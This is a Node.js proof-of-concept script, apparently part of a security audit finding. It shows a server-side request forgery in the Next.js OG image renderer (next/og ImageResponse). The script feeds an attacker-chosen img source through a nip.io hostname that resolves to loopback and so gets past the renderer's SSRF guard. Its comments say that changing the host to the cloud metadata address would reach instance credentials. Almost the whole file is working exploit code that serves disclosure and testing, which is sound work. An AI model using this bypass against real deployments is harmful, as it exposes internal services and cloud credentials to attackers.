// PoC (END-TO-END): next/og ImageResponse performs a server-side fetch to an
// attacker-chosen host that its own "SSRF protection" guard fails to block
// (Finding H7). Runs the SHIPPED vendored @vercel/og bundle — exactly what
// `new ImageResponse(...)` does inside an app's OG route handler.
//
// DEFENSIVE: targets only a loopback listener (127.0.0.1.nip.io -> 127.0.0.1).
// Swapping the host to 169.254.169.254.nip.io would target cloud metadata;
// we intentionally do not.
//
//   node og-ssrf-e2e.mjs
import http from 'node:http'
import { fileURLToPath } from 'node:url'
const OG = fileURLToPath(new URL('../packages/next/src/compiled/@vercel/og/index.node.js', import.meta.url))
const { ImageResponse } = await import(OG)

const onePxPng = Buffer.from(
  'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNk+M8AAAMBAQDJ/pLvAAAAAElFTkSuQmCC',
  'base64'
)
let hit = null
const server = http.createServer((req, res) => {
  hit = req.url
  console.log('  [INTERNAL SERVICE] server-side request received for', JSON.stringify(req.url))
  res.setHeader('content-type', 'image/png')
  res.end(onePxPng)
})
await new Promise((r) => server.listen(0, '127.0.0.1', r))
const port = server.address().port

// Attacker-controlled <img src>: a NON-literal-IP hostname the guard allows,
// which DNS-resolves to the internal/loopback target.
const attackerUrl = `http://127.0.0.1.nip.io:${port}/internal/metadata/token`
console.log('OG route renders attacker-supplied <img src>:', attackerUrl, '\n')

const element = {
  type: 'div',
  props: {
    style: { display: 'flex', width: '100%', height: '100%', background: '#fff' },
    children: { type: 'img', props: { src: attackerUrl, width: 100, height: 100 } },
  },
}
try {
  const buf = Buffer.from(await new ImageResponse(element, { width: 200, height: 200 }).arrayBuffer())
  console.log('\n  ImageResponse produced a', buf.length, 'byte PNG (render completed; fetched bytes embedded).')
} catch (e) {
  console.log('\n  render error:', String(e).split('\n')[0])
}
console.log('\nRESULT:', hit
  ? `SSRF FIRED — server fetched the internal URL ${JSON.stringify(hit)} despite the "SSRF protection" guard.`
  : 'no internal request (guard held / fetch did not fire).')
server.close()
